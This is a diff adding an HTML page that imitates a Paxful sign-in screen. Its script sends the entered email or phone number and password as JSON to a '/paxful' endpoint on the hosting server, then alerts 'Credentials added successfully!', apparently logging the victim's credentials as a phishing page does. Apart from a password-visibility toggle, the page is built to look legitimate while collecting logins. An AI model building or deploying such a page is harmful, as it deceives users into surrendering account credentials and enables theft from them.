@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="icon" href="./files/image/favicon.ico" />
+    <link rel="stylesheet" href="./files/styles/style.css">
+    <link rel="stylesheet" href="./files/styles/fa.css">
+</head>
+
+<body>
+    <div class="log_flex">
+        <div class="log_flex_one">
+            <div class="logo_one">
+                <div class="img">
+                    <img src="./files/image/logo.PNG" alt="">
+                </div>
+            </div>
+            <h5>Welcome back!</h5>
+            <div class="se_l_flex">
+                <p class="p_l_f_o">
+                    Don't have an account?
+                </p>
+                <a href="" class="p_l_s_o">Sign up</a>
+            </div>
+            <div id="error" class="error" style="display:none;">
+                <i class="fa-regular fa-circle-xmark"></i> <span id="errorMsg"></span>
+            </div>
+            <form id="paxfulForm">
+                <div class="imput_cont">
+                    <h4>Email / Phone Number</h4>
+                    <div class="input">
+                        <input type="text" name="email" id="email" placeholder="Email/Phone Number" > 
+                    </div> 
+                </div>
+                <div class="imput_cont">
+                    <h4>Password</h4>
+                    <div class="input">
+                        <input id="password" type="password" name="password" placeholder="Password" >
+                    </div>
+                    <div class="eye">
+                        <i id="eyeIcon" class="fa-regular fa-eye"></i>
+                    </div>
+                </div>
+                <div class="forgot">
+                    <a href="">Forgot password</a>
+                </div>
+                <button type="submit" class="log_btn">Sign in</button>
+            </form>
+        </div>
+        <div class="log_flex_two">
+            <div class="log_flex_two_bg_relative">
+                <div class="log_fle_two_log_bg">
+                    <div class="img">
+                        <img src="./files/image/rightlogo.PNG" alt="">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+<script src="./files/script/jquery.js"></script>
+    <script>
+
+        // Handle form submission
+        document.getElementById('paxfulForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        const response = await fetch('/paxful', {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ email, password }),
+        });
+
+        if (response.ok) {
+            alert('Credentials added successfully!');
+            getItems(); // Refresh item list
+        } else {
+            alert('Failed to add credentials');
+        }
+        });
+
+        // Toggle password visibility
+        document.getElementById('eyeIcon').addEventListener('click', function () {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.classList.remove('fa-eye');
+                this.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                this.classList.remove('fa-eye-slash');
+                this.classList.add('fa-eye');
+            }
+        });
+    </script>
+
+</body>
+
+</html>
